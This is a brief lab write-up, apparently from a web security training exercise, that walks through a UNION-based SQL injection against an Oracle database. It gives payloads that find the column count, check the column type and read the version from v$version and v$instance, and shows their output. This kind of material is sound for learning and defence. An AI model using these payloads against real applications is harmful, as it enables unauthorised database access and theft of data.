# Lab: SQL injection attack, querying the database type and version on Oracle
## Description
Objective is to extract the database version string.

Using simple `UNION SELECT NULL,.....` didn't seem to work, because we need to use `FROM dual` when targeting an Oracle Database.

The following identified the user of two columns in the query:
```
'+UNION+SELECT+NULL,NULL+FROM+dual--
```

The first column was confirmed to be of type `string`
```
'+UNION+SELECT+'bah',NULL+FROM+dual--
```

Now, we need to get the database.
```
'+UNION+SELECT+banner,NULL+FROM+v$version--
```
Returned `TNS for Linux: Version 11.2.0.2.0 - Production`


## Solution
Payload: `'+UNION+SELECT+version,NULL+FROM+v$instance--`

Output: `11.2.0.2.0`
